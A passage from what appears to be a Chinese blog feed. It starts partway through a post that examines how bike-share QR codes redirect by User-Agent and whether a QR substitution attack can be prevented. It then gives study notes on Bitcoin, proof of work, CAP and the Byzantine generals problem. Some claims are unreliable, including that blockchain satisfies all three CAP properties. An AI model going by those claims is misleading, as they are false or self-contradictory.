class="attribute">http</span>:<span class="comment">//c3x.me/?n=3110457021</span></span><br><span class="line">4<span class="number">5610663692</span>: <span class="attribute">http</span>:<span class="comment">//c3x.me/?n=5610663692</span></span><br><span class="line">4</span><br><span class="line">didi <span class="attribute">bike</span>:</span><br><span class="line">4<span class="attribute">https</span>:<span class="comment">//dc.tt/htw?id=1B24C1D&amp;p=2</span></span><br><span class="line">4<span class="attribute">https</span>:<span class="comment">//dc.tt/htw?id=1B4910D&amp;p=2</span></span><br></pre></td></tr></table></figure><p>用电脑直接访问该网址</p><ul><li><p>Mobike是直接跳转到app推荐页面，打开下载，是腾讯合作方的应用宝下载</p></li><li><p>hello bike也是直接跳转至app推荐页面，打开下载，属于hellobike自己搭建的下载页面</p></li><li><p>滴滴是跳转到小程序推荐页面，</p></li></ul><h4 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h4><p><img src="https://magic-king.net/images/loading.gif" data-original="QRCodeAttack\11.jpg" style="zoom:150%;"></p><p>由图可见，明显的一个env变量，推测是用来判断用的。</p><p>然后下面就是对enc进行逻辑判断，然后处理跳转</p><p>我的浏览器是跳转到了<code>http://c3x.me/bike.html?n=3110469617</code></p><p><code>https://c3x.me/wechat-ebike.html?n=3110469617</code>是对微信内置浏览器做的一些页面自适应</p><p>再次应该是对User-Agent进行判断，并跳转至相应页面，代码如下：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基本环境及参数</span></span><br><span class="line">   <span class="keyword">var</span> ua = <span class="keyword">window</span>.navigator.userAgent;</span><br><span class="line">   <span class="keyword">var</span> params = &#123;&#125;;</span><br><span class="line">   <span class="keyword">if</span> (location.<span class="keyword">search</span>) &#123;</span><br><span class="line">     <span class="keyword">var</span> parts = location.<span class="keyword">search</span>.substring(1).<span class="keyword">split</span>('&amp;');</span><br></pre></td></tr></table></figure><blockquote><p>关于window.navigator.userAgent：<a href="https://blog.csdn.net/liangyihe/article/details/78464656" target="_blank" rel="noopener">https://blog.csdn.net/liangyihe/article/details/78464656</a></p></blockquote><p>以下是苹果的useragent，用去替换</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">UserAgent:</span>Mozilla/<span class="number">5.0</span> (iPhone<span class="comment">; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1</span></span><br></pre></td></tr></table></figure><p>果然是同一个页面的不同适应性处理</p><p>对于aliBrowser，是对应跳转到相应的下载界面，采用<code>alipays://plat....</code></p><p>对于哈喽bike App也是跳转到自身的路由，然后再其服务端做处理</p><h4 id="Mobike"><a href="#Mobike" class="headerlink" title="Mobike"></a>Mobike</h4><p>抓包访问，发现是直接301了（永久性转移），然后没找到解决办法</p><p>因为是直接跳转至下载界面，所有没有和此单车合作的app都是跳转至下载界面，抓包失败</p><h4 id="didi"><a href="#didi" class="headerlink" title="didi"></a>didi</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">this.config <span class="number">0</span>  </span><br><span class="line">&#123;…&#125;</span><br><span class="line"></span><br><span class="line"><span class="symbol">__method__:</span> <span class="string">"POST"</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">_source:</span> <span class="string">"https://page.xiaojukeji.com/m/hellopage.html?id=1B24C1D&amp;p=2"</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">api_version:</span> <span class="string">"1.0.1"</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">app_version:</span> <span class="string">"1.8.7"</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">appid:</span> <span class="number">30004</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">auto_fill_phone:</span> true</span><br><span class="line"></span><br><span class="line"><span class="symbol">canonical_country_code:</span> <span class="string">"CN"</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">checkPhone:</span> true</span><br><span class="line"></span><br><span class="line"><span class="symbol">city_id:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">country_calling_code:</span> <span class="string">"+86"</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">country_filter:</span> Array []</span><br><span class="line"></span><br><span class="line"><span class="symbol">country_id:</span> <span class="number">156</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">from:</span> <span class="string">"webapp"</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">imei:</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">lang:</span> <span class="string">"zh-CN"</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">law_checked:</span> false</span><br><span class="line"></span><br><span class="line"><span class="symbol">origin_id:</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">role:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">scene:</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">showCodeSign:</span> false</span><br><span class="line"></span><br><span class="line"><span class="symbol">styleObj:</span> <span class="class">Object </span>&#123;  &#125;</span><br><span class="line"></span><br><span class="line"><span class="symbol">useOauthCode:</span> false</span><br><span class="line"></span><br><span class="line"><span class="params">&lt;prototype&gt;</span>: <span class="class">Object </span>&#123; … &#125;</span><br><span class="line">login.min.js:<span class="number">1</span>:<span class="number">36888</span></span><br></pre></td></tr></table></figure><p>明显的一个post请求，而且采用了https，不好抓包</p><p>但是预测是跳转至小程序，属于微信小程序的。</p><hr><p>手机抓包工具：fiddler，frida</p><hr><p>通过以上可发现，共享单车的二维码大多都是通过二维码的url格式存储，然后通过url访问判断其user-Agent推测出使用的浏览器，然后做不同的路由处理或使用自身协议，如<code>alipays://</code></p><h3 id="关于密码学与二维码的思考"><a href="#关于密码学与二维码的思考" class="headerlink" title="关于密码学与二维码的思考"></a>关于密码学与二维码的思考</h3><p>在二维码多存入证书，存储的数据量应该会变大，但是不至于存不下，但是这是没有必要的。</p><p>当扫完二维码访问其指向的url时，该请求已向ocsp请求在线证书了；而且该种方法也无法避免中间人攻击。（参考https的ssl中间人攻击）</p><blockquote><p>https中的ssl中间人攻击</p><p><a href="https://blog.csdn.net/u013152718/article/details/47081541" target="_blank" rel="noopener">通过伪造CA证书，实现SSL中间人攻击</a></p><p><a href="https://blog.csdn.net/qq_26090065/article/details/81256662" target="_blank" rel="noopener">SSL,TLS中间人攻击</a></p><p><a href="https://www.cnblogs.com/lulianqi/p/10558719.html" target="_blank" rel="noopener">HTTPS中间人攻击实践（原理·实践）</a></p></blockquote><p>至于二维码替换更加无可避免，因此还是采用信任可信第三方的(官方app，以及有合作的app)方法比较安全。（因为其用的是路由判断，不存在假的url能跳转）</p><p>其次，假如在二维码中加入hash判断，也是不可行的。因为密码学不能依赖于不公开的算法，而且可以通过暴力匹配算出hash算法的流程。因此得知流程，将假url和假url的hash一起替换原url以及其hash便可产生攻击。</p>]]></content>
      
      
      <categories>
          
          <category> QRCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QRCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BlockChain</title>
      <link href="/2019/12/26/BlockChain/"/>
      <url>/2019/12/26/BlockChain/</url>
      
        <content type="html"><![CDATA[<h2 id="Bitcoin"><a href="#Bitcoin" class="headerlink" title="Bitcoin"></a>Bitcoin</h2><h4 id="数字货币和纸质货币的对比"><a href="#数字货币和纸质货币的对比" class="headerlink" title="数字货币和纸质货币的对比"></a>数字货币和纸质货币的对比</h4><table><thead><tr><th><strong>属性</strong></th><th><strong>分析</strong></th><th><strong>优势方</strong></th></tr></thead><tbody><tr><td>便携</td><td>大部分场景（特别是较大数额支付时）下数字货币将具备更好的便携性</td><td>数字货币</td></tr><tr><td>防伪</td><td>两者各有千秋，但数字货币整体上会略胜一筹。 纸币依靠的是各种设计（纸张、油墨 、防伪 暗纹 、 夹层等）上的精巧，数字货币依靠的则是密码学上的保障。 事实上，纸币的伪造时有发生，但数字货币的伪造目前还无法实现</td><td>数字货币</td></tr><tr><td>辨伪</td><td>纸币即使依托验钞机等专用设备仍会有误判情况，数字货币依靠密码学易于校验</td><td>数字货币</td></tr><tr><td>匿名</td><td>通常情况下，两者都能提供很好的匿名性 。 但都无法防御有意的追踪</td><td>持平</td></tr><tr><td>交易</td><td>对纸币来说，谁持有纸币谁就是合法拥有者，交易通过纸币自身的转移即可完成，无法复制 。 对数字货币来说则复杂得多，因为任何数字物品都是可以被复制的，但数字 形式也意味着转移成本会更低 。 总体上看，两者适用不同的情景</td><td>持平</td></tr><tr><td>资源</td><td>通常情况下，纸币的生产成本要远低于面额。 数字货币消耗资源的计算则复杂得多 。 以比特币为例，最坏情况下可能需要消耗接近甚至超过面值的电能</td><td>持平</td></tr><tr><td>发行</td><td>纸币的发行需要第三方机构的参与，数字货币则通过分布式算法来完成发行。 在人类历史上，通胀和通缩往往是不合理地发行货币造成的，而数字货币尚缺乏大规模验证， 还有待观察</td><td>持平</td></tr><tr><td>管理</td><td>纸币发行和回收往往通过统一机构，易于监管和审计；目前出现的数字货币在这方面 还缺乏足够支持和验证</td><td>纸币</td></tr></tbody></table><h4 id="双重支付攻击"><a href="#双重支付攻击" class="headerlink" title="双重支付攻击"></a>双重支付攻击</h4><p>对于数字货币来说，数字化内容容易被复制。数字货币持有人可以将同一份货币发给多个接收者，这种攻击称为“双重支付攻击”。</p><p>数字货币1.0：即银行中通过电子账号里面的数字记录了客户的资产</p><p>但他依赖于一个前提：假定存在一个安全可靠的第三方记账机构负责记账，这个机构负责所有的担保环节，最终完成交易。</p><p>银行、支付宝都属于这种类型。</p><h4 id="去中心化的技术难关"><a href="#去中心化的技术难关" class="headerlink" title="去中心化的技术难关"></a>去中心化的技术难关</h4><ul><li>货币的防伪：谁负责对货币的真伪进行鉴定</li><li>货币的交易：如何确保货币从一方安全转移到另外一方</li><li>避免双重支付：如何避免同一份货币支付给多个接收者</li></ul><h4 id="数字货币的定义"><a href="#数字货币的定义" class="headerlink" title="数字货币的定义"></a>数字货币的定义</h4><p>数字货币可以认为是一种<strong>基于节点网络和数字加密算法的虚拟货币</strong>。数字货币的<strong>核心特征</strong>主要体现在三个方面：</p><p>①由于来自于某些开放的算法，数字货币没有发行主体，因此没有任何人或机构能够控制它的发行；</p><p>②由于算法解的数量确定，所以数字货币的总量固定，这从根本上消除了虚拟货币滥发导致的可能；</p><p>③由于交易过程需要网络中的各个节点的认可，因此数字货币的交易过程足够安全 。</p><p>数字货币是一种不受管制的、数字化的货币，通常由开发者发行和管理，被特定虚拟社区的成员所接受和使用。欧洲银行业管理局将虚拟货币定义为：价值的数字化表示，不由央行或当局发行，也不与法币挂钩，但由于被公众所接受，所以可作为支付手段，也可以电子形式转移、存储或交易 </p><h4 id="比特币的诞生"><a href="#比特币的诞生" class="headerlink" title="比特币的诞生"></a>比特币的诞生</h4><p>2008 年 10 月 31 日， 一位化名 Satoshi Nakamoto （中本聪）的人在 metzdowd 密码学邮件列表中提出了比特币（ Bitcoin）的设计白皮书《 Bitcoin: A Peer-to-Peer Electronic Cash System 》，并在2009 年公开了最初的实现代码 。 </p><h4 id="比特币的意义和价值"><a href="#比特币的意义和价值" class="headerlink" title="比特币的意义和价值"></a>比特币的意义和价值</h4><p>比特币首次真正从实践意义上实现了<strong>安全可靠的去中心化数字货币机制</strong> ，这也是它受到无数金融科技从业者热捧的根本原因 。 </p><ul><li>作为一种概念货币，比特币主要希望解决已有货币系统面临的几个核心问题：<ul><li>被掌控在单一机构手中，容易被攻击 </li><li>自身的价值无法保证，容易出现波动 </li><li>无法匿名化交易，不够隐私</li></ul></li></ul><h5 id="比特币的生态系统如下："><a href="#比特币的生态系统如下：" class="headerlink" title="比特币的生态系统如下："></a>比特币的生态系统如下：</h5><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain/1.jpg" alt="比特币的生态系统"></p><p>区块链因比特币而生，但是现在已经脱离了比特币网络自身。</p><h2 id="Block-Chain"><a href="#Block-Chain" class="headerlink" title="Block Chain"></a>Block Chain</h2><p>区块链本质上是一个去中心化的数据库，又不仅仅是一个数据库。是一串使用密码学方法相关联产生的数据块，每一个数据块中包含了一组比特币网络交易的信息，用于验证其信息的有效性(防伪)和生成下一个区块。</p><p>2015年被业界视为区块链元年，2016年则是区块链产业深化发展和全面加速前行的一年，2019年为“上链元年”。</p><ul><li>区块链的<strong>特点</strong><ul><li>分布式容错性：分布式网络及其鲁棒，能够容忍部分节点的异常状态</li><li>不可篡改性：一致提交后的数据会一直存在，不可销毁和修改</li><li>隐私保护性：密码学保证了数据隐私，即便数据泄露也无法解析</li></ul></li><li>随之带来的业务特性<ul><li>可信任性：区块链技术可以提供天然可信的分布式账本平台，不需要额外的第三方中介机构参与</li><li>降低成本：跟传统技术相比，区块链技术可能需要时间、人力和维护成本更少</li><li>增强安全：区块链技术将有利于安全、可靠的审计管理和账目清算，减少犯罪风险</li></ul></li></ul><p>所有跟<strong>信息、价值、信用</strong>等相关的交换过程，都将可能从区块链技术中得到启发或直接受益。</p><p>Wikipedia的定义：是借由密码学串接并保护内容的串连文字记录。类比于一种分布式数据库技术，通过维护数据块的链式结构，可以维持持续增长的、不可篡改的数据记录。</p><p>区块链技术最早的应用出现在比特币项目中。</p><p>基本概念：</p><ul><li>交易（transaction）：一次对账本的操作，导致账本状态的一次改变，如添加一条转账记录</li><li>区块（block）：记录一段时间内发生的所有交易和状态结果，是对当前账本状态的一次共识</li><li>链（chain）：由区块按照发生顺序串联而成，是整个账本状态变化的日志记录</li></ul><p>若把区块链作为一个状态机，则每一次交易是视图改变一次状态，而每次共识生成的区块，就是参与者对于区块中交易导致状态的改变的结果进行确认。</p><p>在实现上，首先假设存在一个分布式的数据记录账本，这个账本只允许添加 、 不允许删除 。 账本底层的<strong>基本结构</strong>是一个<strong>线性的链表</strong>，这也是其名字“区块链”的来源 。</p><p>链表由一个个“区块”串联组成，后继区块记录前导区块的哈希值（ pre hash ） 。 新的数据要加入，必须放到一个新的区块中 。 而这个块（以及块里的交易）是否合法，可以通过计算哈希值的方式快速检验出来 。 任意维护节点都可以提议一个新的合法区块，然而必须经过一定的共识机制来对最终选择的区块达成一致。 </p><blockquote><ul><li>比特币为例，区块链的共组过程</li></ul><ol><li><p>比特币客户端发起一项交易，广播到比特币网络中并等待确认 。</p></li><li><p>网络中的节点会将一些收到的等待确认的交易记录打包在一起（此外还要包括前一个区块头部的哈希值等信息），组成一个候选区块 。 </p></li><li><p>试图找到一随机串放到区块里，使得候选区块的哈希结果满足一定条件（比如小于某个值） 。 这个 nonce 串的查找需要一定的时间去进行计算尝试。</p></li><li><p>一旦节点算出来满足条件的 nonce 串，这个区块在格式上就被认为是“合法”了，就可以尝试在网络中将它广播出去 。 </p></li><li><p>其他节点收到候选区块，进行验证，发现确实符合约定条件了，就承认这个区块是一个合法的新区块，并添加到自己维护的区块链上 。</p></li><li><p>当大部分节点都将区块添加到自己维护的区块链结构上时，该区块被网络接受，区块中所包括的交易也就得到确认 。 </p></li></ol></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain/2.jpg" alt="区块链工作流程"></p><p>如图，A想要向B发起交易（1，2），做工作量证明，然后将交易广播至区块链网络中（3），让其他节点验证工作量证明（4），验证成功后，将交易区块加入该链的末尾（5），交易成功（6）。</p><h4 id="工作量证明"><a href="#工作量证明" class="headerlink" title="工作量证明"></a>工作量证明</h4><p>Proof of Work：简称PoW，即工作量证明。比特币的这种基于算力寻找 nonce 串的共识机制。 目前，要让哈希结果满足一定条件，并无已知的快速启发式算法，只能进行尝试性的暴力计算 。 尝试的次数越多（工作量越大），算出来的概率越大 。</p><p>通过调节对哈希结果的限制，比特币网络控制平均约 10 分钟产生一个合法区块 。 算出区块的节点将得到区块中所有交易的管理费和协议固定发放的奖励费（目前是 12.5 比特币，每四年减半），这个计算新区块的过程俗称为<strong>挖矿</strong> 。 </p><p>比特币网络中存在大量（据估计数千个）的维护节点，而且大部分节点都是正常工作的，默认都只承认所看到的最长的链结构 。 只要网络中不存在超过一半的节点提前勾结一起采取恶意行动，则最长的链将很大概率上成为最终合法的链 。 而且随着时间增加，这个概率会越来越大。 例如，经过 6 个区块生成后，即便有一半的节点联合起来想颠覆被的结果，其概率也仅为（1/2)<sup>6</sup> = 1.6% ，即低于 1 /60 的可能性 。当然，如果整个网络中大多数的节点都联合起来作恶，可以导致整个系统无法正常工作 。 要做到这一点，往往意味着付出很大的代价，跟通过作恶得到的收益相比，得不偿失 。 </p><h4 id="区块链的演化"><a href="#区块链的演化" class="headerlink" title="区块链的演化"></a>区块链的演化</h4><ul><li><p>区块链1.0</p><p>​        区块链1.0是随着比特币的发明而引入，基于用于加密货币</p></li><li><p>区块链2.0</p><p>​        主要用于金融服务，在这一阶段引入合同</p></li><li><p>区块链3.0</p><p>​        用于金融服务行业之外，同时还包括政府、卫生、媒体、艺术和司法等更综合的行业</p></li><li><p>Generation X（区块链X）</p><p>​        这是区块链发展过程中一个奇点，有一天我们将会拥有一个公共区块链服务，任何人都可以使用，进而在所有领域提供服务</p></li></ul><p>三种典型演化场景</p><table><thead><tr><th>场景</th><th>功能</th><th>智能合约</th><th>一致性</th><th>权限</th><th>类型</th><th>性能</th><th>编程语言</th><th>代表</th></tr></thead><tbody><tr><td>公信的数字货币</td><td>记账功能</td><td>不带有或较弱</td><td>Pow</td><td>无</td><td>公有链</td><td>较低</td><td>简单脚本</td><td>比特币网络</td></tr><tr><td>公信的交易处理</td><td>智能合约</td><td>图灵完备</td><td>PoW、PoS</td><td>无</td><td>公有链</td><td>受限</td><td>待定语言</td><td>以太坊网络</td></tr><tr><td>带权限的分布式账本处理</td><td>商业处理</td><td>多种语言、图灵完备</td><td>包CFT、BFT在内的多种机制、可插拔</td><td>支持</td><td>联盟链</td><td>可扩展</td><td>高级编程语言</td><td>超级账本</td></tr></tbody></table><p>演化出的几种类型：</p><blockquote><ul><li>公有区块链：对公众开放，任何人都可以作为节点参与进来。任何人不会持有该账本，而且向任何参与者开放</li><li>私有区块链：仅向特定组织开放，进而确定账本的共享过程</li><li>半私有区块链：兼具私有性和公有性，私有部分由某一团体控制，而公有部分则向参与者开放</li><li>侧链技术：包括单路楔入式侧链和双路楔入式侧链。针对后者，货币可在主链和侧链间移动，并在必要时返回至主链</li><li>许可账本：参与者是已知且受信的，许可账本不需要使用分布式协商一致机制，相反，可以使用一致性协议来维护共享账本</li><li>分布式账本：分布式账本分布在参与者之间，并扩散于多个站点或组织中。对应的记录是连续存储的，而不是按情况排序的</li><li>共享账本：共享的应用程序和数据库</li><li>全私有和专有账本：适用于组织内部的特定私有环境共享数据，并提供数据的真实性保证</li><li>标记化区块链：标准的区块链，通过挖掘和初始分布来生成加密货币</li><li>无代币区块链：不需在节点间传递值，只需在受信各方之间共享数据</li></ul></blockquote><h5 id="区块链是首个自带对账功能的数字记账技术实现"><a href="#区块链是首个自带对账功能的数字记账技术实现" class="headerlink" title="区块链是首个自带对账功能的数字记账技术实现"></a><strong>区块链是首个自带对账功能的数字记账技术实现</strong></h5><p>  跟传统的记账技术相比，<strong>基于区块链的分布式账本</strong>应该包括如下<strong>特点</strong>：</p><ul><li><p>维护一条不断增长的链，只可能添加记录，而发生过的记录都<strong>不可篡改</strong></p></li><li><p><strong>去中心化</strong>，或者说多中心化，无需集中控制而能达成共识，实现上尽量采用分布式</p></li><li><p>通过<strong>密码学的机制</strong>来确保交易无法被抵赖和破坏，并尽量保护用户信息和记录的隐私性 </p></li></ul><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>根据参与者的不同，可以分为公开（public）链、联盟（ consortium）链和私有（private）链。</p><ul><li><strong>公有链</strong>，顾名思义，任何人都可以参与使用和维护，如比特币区块链，信息是完全公开的；</li></ul><p>如果进一步引入许可机制，可以实现私有链和联盟链两种类型：</p><ul><li><p><strong>私有链</strong>，由集中管理者进行管理限制，只有内部少数人可以使用，信息不公开；</p></li><li><p><strong>联盟链</strong>则介于两者之间，由若干组织一起合作维护一条区块链，该区块链的使用必须是带有权限的限制访问，相关信息会得到保护，如供应链机构或银行联盟 。 </p></li></ul><h2 id="分布式系统与去中心化"><a href="#分布式系统与去中心化" class="headerlink" title="分布式系统与去中心化"></a>分布式系统与去中心化</h2><h3 id="分布式系统"><a href="#分布式系统" class="headerlink" title="分布式系统"></a>分布式系统</h3><ul><li>区块链的核心是一个<strong>去中心化的分布式系统</strong></li><li>分布式系统中的节点可以相互交换信息</li><li>节点分为可信节点、缺陷节点、恶意节点。一个由任意行为的节点被称为<strong>拜占庭节点</strong>，网络上某个出现任何意外行为的节点都可归类于拜占庭节点。</li><li>分布式系统的<strong>主要挑战</strong>：节点与容错的协调，即一个节点的失效不影响整个系统的运行</li></ul><ul><li><p>同步系统：Synchronous System: Known bounds on times for message transmission, processing , bounds on local clock drifts, etc.(Can use timeout)</p></li><li><p>异步系统：Asynchronous System: No known bounds on times for message transmission, processing, bounds on local clock drifts, etc.(More realistic, practical, but no timeout.)</p></li></ul><h3 id="CAP定理"><a href="#CAP定理" class="headerlink" title="CAP定理"></a>CAP定理</h3><p>cap定理，又称布鲁尔定理：任意分布式系统<strong>不能同时拥有</strong>一致性、可用性、分区容错性</p><ul><li>一致性(Consistency)：任意节点拥有最新数据副本</li><li>可用性(Availablitiy)：系统在使用期间可以被访问，接收请求并在必要时做出响应</li><li>分区容错性(Partition Tolerance)：一组节点的失效不影响系统的运行</li></ul><p>一般是淘宝的系统可用性可以达到5个9，意思是他的可用水平是99.999%，即全年停机时间不超过<code>(1-0.99999)*365*24*60 = 5.256min</code></p><p><img src="https://magic-king.net/images/loading.gif" data-original="BlockChain\3.jpg" alt></p><p><strong>CP without A </strong>：一旦发生网络故障或者消息丢失等情况，就要牺牲用户的体验，等待所有数据全部一致了之后再让用户访问系统。分布式存储系统(Redis、Hbase),分布式协调组件Zookeeper.</p><p><strong>AP wihtout C</strong>：要高可用并允许分区，则需放弃一致性。一旦网络问题发生，节点之间可能会失去联系。为了保证高可用，需要在用户访问时可以马上得到返回，则每个节点只能用本地数据提供服务，而这样会导致全局数据的不一致性。</p><p>淘宝的购物，12306的买票，都是在可用性和一致性之间舍弃了可用性而选择一致性。保证了最终一致性。</p><p>然而区块链可以实现这三种属性</p><blockquote><p>通过复制的方式实现容错性</p><p>通过一致性算法确保所有节点具有相同的数据</p></blockquote><h3 id="拜占庭将军问题"><a href="#拜占庭将军问题" class="headerlink" title="拜占庭将军问题"></a>拜占庭将军问题</h3><p>一群领导拜占庭各部军队的陆军将军，计划从某一城市进攻或撤退。这里，将军们之间的唯一沟通方式是信使，他们需要就同时进攻达成一致意见，以赢得胜利。</p><p><strong>问题：</strong>一名或多名将军或许是叛徒，可以传达一个误导信息。因此，有必要找到一种可行的机制，让将军们之间达成某种协议，这样就可以同时进行攻击。</p><p>相较于分布式系统，将军可视作节点，叛国者则视作拜占庭（恶意的）节点，信使是将军之间沟通的渠道。</p><h4 id="拜占庭将军失效"><a href="#拜占庭将军失效" class="headerlink" title="拜占庭将军失效"></a>拜占庭将军失效</h4><p>所谓拜占庭失效指一方向另一方发送消息，另一方没有收到，或者收到了错误的信息的情形。</p><p>在容错的分布式计算中，拜占庭失效可以是分布式系统中算法执行过程中的任意一个错误。这些错误被统称为“<strong>崩溃失效</strong>”和“<strong>发送与遗漏式失效</strong>”。当拜占庭失效发生时，系统可能会做出任何不可预料的反应。</p><p>这些任意的失效可以粗略地分成以下几类：</p><blockquote><ol><li><p>进行算法的另一步时失效，即崩溃失效；</p></li><li><p>无法正确执行算法的一个步骤；</p></li><li><p>执行了任意一个非算法指定的步骤。</p></li></ol></blockquote><p>各个步骤由各进程执行，算法就是由这些进程执行的。一个错误的进程是在某个点出现了上述情况的进程。没有出现错误的进程是正确的进程。</p><h4 id="拜占庭将军问题——解决算法"><a href="#拜占庭将军问题——解决算法" class="headerlink" title="拜占庭将军问题——解决算法"></a>拜占庭将军问题——解决算法</h4><p>拜占庭问题的最初描述是：n 个将军被分隔在不同的地方，忠诚的将军希望通过某种协议达成某个命令的一致（比如一起进攻或者一起后退）。但其中一些背叛的将军会通过发送错误的消息阻挠忠诚的将军达成命令上的一致。<strong>Lamport 证明了在将军总数大于3m ，背叛者为m 或者更少时，忠诚的将军可以达成命令上的一致。</strong></p><ul><li>为了保证上面的需求，必须满足下面两个条件：<ul><li>IC1. 所有忠诚的副官遵守相同的命令，即一致性</li><li>IC2. 如果发出命令的将军是忠诚的，那么所有忠诚的副官遵守司令（发出命令的将军）的命令，即正确性</li></ul></li></ul><blockquote><p><strong>特别提示</strong>：</p><p>发送命令的每次只有一个将军，将其命令发送给n-1 个副官。</p><p>m 代表叛国者的个数，因为将军总数为n，所以副官总数为n-1 个。</p><p>IC2 中副官遵守实际上是指忠诚的将军能够正确收到忠诚将军的命令消息。</p></blockquote><h4 id="消息传递"><a href="#消息传递" class="headerlink" title="消息传递"></a>消息传递</h4><ul><li>通过消息传递达到一致，如果有m 个叛国将军，则将军们的总数必须为3m+1 个以上。下面是消息传递过程中默认的一些条件：<ul><li>A1.  每个被发送的消息都能够被正确的投递</li><li>A2.  信息接收者知道是谁发送的消息</li><li>A3.  能够知道缺少的消息</li></ul></li></ul><p>A1 和 A2 假设了两个将军之间通信没有干扰，既不会有背叛者阻碍消息的发送（截断）也不会有背叛者伪造消息的情况（伪造）。即是每个将军都可以无误地将自己的消息发送给其他每个将军。</p><h4 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h4><blockquote><p><a href="https://blog.csdn.net/michael_kong_nju/article/details/17612275" target="_blank" rel="noopener">拜占庭将军问题。口头算法OM(n.m);n=3m+1</a></p></blockquote><p>OM(m)算法：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">消息算法OM(m) 。对于所有的非负整数m ，每个发令者通过OM(M) 算法发送命令给n<span class="string">-1</span> 个副官。</span><br><span class="line"></span><br><span class="line"># 将军通过副官传递消息:即, 消息传递路线: 将军i--Message--&gt;副官i --boardcast--&gt;副官j--Message--&gt;将军j</span><br><span class="line"></span><br><span class="line">（1）发令者将他的命令发送给每个副官。</span><br><span class="line">（2）对于每个i ，vi 是每个副官i 从发令者收到的命令，如果没有收到命令则为撤退命令。副官i 在OM(m<span class="string">-1</span>) 中作为发令者将vi 发送给另外n<span class="string">-2</span> 个副官。</span><br><span class="line">（3）对于每个i，并且j 不等于 i，vj 是副官i 从第（2）步中的副官j 发送过来的命令（使用   OM(m<span class="string">-1</span>)算法），如果没有收到第（2）步中的副官j 的命令则默认为撤退命令。最后副官i 使用majority(v1,…,vn<span class="string">-1</span>)得到命令。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">定义majority(cmd1,cmd2,…,cmdn)等于多数派命令。</span><br><span class="line"></span><br><span class="line">第一轮将军发给所有副官命令</span><br><span class="line">第二轮n<span class="string">-1</span>副官互通将军发了什么,确定将军是否为叛徒,若将军是叛徒，则将军的消息无效,舍弃;将军忠诚,即可在第二轮已可决定</span><br><span class="line">第三轮n<span class="string">-1</span>副官互通某个副官各给别人发了什么消息,遍历n<span class="string">-2</span>个副官的消息以判断自己作何决定</span><br><span class="line">(例:若L1收到其它L2~L6发来的Vj, 但是他要怀疑准确性，比如L1会想L2发给自己是否是正确的呢？那么就进入第三轮进行投票.因此跟在第2轮之后,L1会依次询问L3,4,5,6 ，问他们上一轮L2给他们发了什么,L1得到第二轮中L2-&gt;L3,L2-&gt;L4,L2-&gt;L5,L2-L6,再结合L2-&gt;L1，从5个里用majority函数决定L2发了啥，再依次遍历L3<span class="string">-6</span>,然后L1完成第二轮的确认)</span><br></pre></td></tr></table></figure><h4 id="算法证明"><a href="#算法证明" class="headerlink" title="算法证明"></a>算法证明</h4><p>详细的算法证明可参考：</p><blockquote><p><a href="https://baike.baidu.com/item/%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%B0%86%E5%86%9B%E9%97%AE%E9%A2%98/265656?fr=aladdin" target="_blank" rel="noopener">拜占庭将军百度百科</a></p><p><a href="https://www.zhihu.com/question/23167269" target="_blank" 